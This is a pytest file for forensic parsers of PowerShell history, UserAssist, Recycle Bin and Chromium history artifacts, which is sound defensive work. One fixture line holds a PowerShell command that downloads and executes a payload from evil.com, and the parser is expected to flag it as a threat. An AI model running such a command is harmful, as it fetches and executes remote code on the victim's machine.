# tests/test_parsers.py
import os
import sqlite3
import pytest
from parsers import powershell_parser, userassist_parser, browser_parser, recycle_parser, startup_parser

def test_powershell_parser(tmp_path):
    ps_file = tmp_path / "ConsoleHost_history.txt"
    ps_file.write_text("whoami\nInvoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload')\n", encoding="utf-8")
    
    records = powershell_parser.parse_powershell_file(str(ps_file))
    assert len(records) == 2
    assert records[0]["artifact_type"] == "powershell_cmd"
    assert "whoami" in records[0]["name"]
    # Check threat heuristics
    assert "High" in records[1]["extra"] or "Dynamic Code Execution" in records[1]["extra"]

def test_userassist_rot13_decoding():
    decoded = userassist_parser._rot13("HRZR_EHACNGU:P:\\Grfg\\ncv.rkr")
    assert "UEME_RUNPATH:C:\\Test\\api.exe" == decoded

def test_recycle_parser(tmp_path):
    # Dummy non-matching file
    dummy_file = tmp_path / "$I123456.txt"
    dummy_file.write_bytes(b"\x00" * 10)
    records = recycle_parser.parse_i_file(str(dummy_file))
    assert isinstance(records, list)

def test_chromium_history_parsing(tmp_path):
    db_file = tmp_path / "History"
    conn = sqlite3.connect(str(db_file))
    cur = conn.cursor()
    cur.execute("CREATE TABLE urls (id INTEGER PRIMARY KEY, url TEXT, title TEXT, visit_count INTEGER, typed_count INTEGER, last_visit_time INTEGER)")
    cur.execute("CREATE TABLE downloads (id INTEGER, current_path TEXT, target_path TEXT, start_time INTEGER, end_time INTEGER, total_bytes INTEGER, tab_url TEXT)")
    cur.execute("INSERT INTO urls VALUES (1, 'https://github.com/chinmayiM-bhise', 'GitHub Profile', 5, 2, 13350000000000000)")
    cur.execute("INSERT INTO downloads VALUES (1, 'C:\\Downloads\\malware.exe', 'C:\\Downloads\\malware.exe', 13350000000000000, 13350000000000000, 1048576, 'https://example.com/malware.exe')")
    conn.commit()
    conn.close()

    records = browser_parser.parse_chromium_history(str(db_file))
    assert len(records) == 2
    types = [r["artifact_type"] for r in records]
    assert "browser_url" in types
    assert "browser_download" in types
